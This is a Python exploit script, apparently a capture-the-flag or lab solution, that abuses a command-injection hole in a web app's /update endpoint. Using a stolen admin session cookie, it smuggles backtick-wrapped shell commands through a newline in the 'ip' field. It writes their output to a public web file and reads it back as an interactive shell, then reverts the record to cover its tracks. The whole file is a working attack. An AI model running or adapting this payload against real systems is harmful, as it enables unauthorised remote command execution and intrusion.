#!/usr/bin/env python3

import sys
import bs4
import requests

OUTPUT_FILE = '.keep'
OUTPUT_PATH = '/var/www/public/'
URL = 'http://localhost:8000/'

def inject_command(cookie, command):

    admin_cookie = { 'rack.session' : cookie }

    output = OUTPUT_PATH + OUTPUT_FILE

    payload = {
        'id'    : '1',
        'name'  : 'webmail',
        'ip'    : f'192.168.3.10\n`{command} > {output}`',
        'ttl'   : '600'
    }

    resp = requests.post(URL + '/update', cookies=admin_cookie, data=payload)

    # Undo update
    payload['ip'] = '192.168.3.10'
    requests.post(URL + '/update', cookies=admin_cookie, data=payload)

    return resp

def get_result():
    return requests.get(URL + OUTPUT_FILE).text

def run_shell(cookie):
    while(True):
        cmd = input("cmd> ")

        resp = inject_command(cookie, cmd)

        soup = bs4.BeautifulSoup(resp.text, 'html.parser')

        if '\nInvalid data provided' in soup.find('div', {"class": "alert-message error"}):
            print("( ERROR ) : failed to process command")
        else:
            print(get_result())

def help():
    print("usage: cmd-injection.py <admin-cookie>")
    exit(1)

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        help()

    with open(sys.argv[1]) as file:
        cookie = file.read().rstrip()

        run_shell(cookie)
    